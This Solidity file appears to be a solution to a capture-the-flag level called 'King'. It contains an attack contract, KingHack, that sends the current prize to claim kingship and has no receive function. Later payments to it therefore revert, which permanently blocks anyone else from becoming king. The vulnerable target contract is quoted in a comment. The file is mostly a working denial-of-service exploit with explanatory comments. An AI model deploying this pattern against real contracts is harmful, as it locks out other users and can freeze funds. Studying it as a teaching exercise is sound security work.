// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IKing {
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

// Use `await web3.eth.getStorageAt(contract.address, 1)` in console to grab the current prize amount.
// The hexidecimal response corresponds to 0.001 ETH when converted to decimal.
contract KingHack {

    // targetAddress must be payable so we can send ETH to it.
    // constructor must be payable to initialize itself with ETH
    constructor(address payable targetAddress) payable {

        // Uses King contract to grab the current prize amount.
        uint prize = IKing(targetAddress).prize();

        // call is a function that interacts with another contract
        // So we give the value field prize, and keep the data payload an empty string
        // It returns a tuple (bool, bytes), but we don't care about the bytes.
        // send prize amount of eth to King contract, so this KingHack contract becomes king.
        (bool success,) = targetAddress.call{ value : prize }("");

        // Call must be successful, otherwise revert.
        require(success, "call failed");
    }
    // By not having any function to handle incoming ETH, all transfer requests will always revert.
    // Therefore 'payable(king).transfer(msg.value);' always fails after we are king.
    // We always stay as king because nobody can finish execution of the receive method from King contract.
}

/*
// Target Contract
contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
*/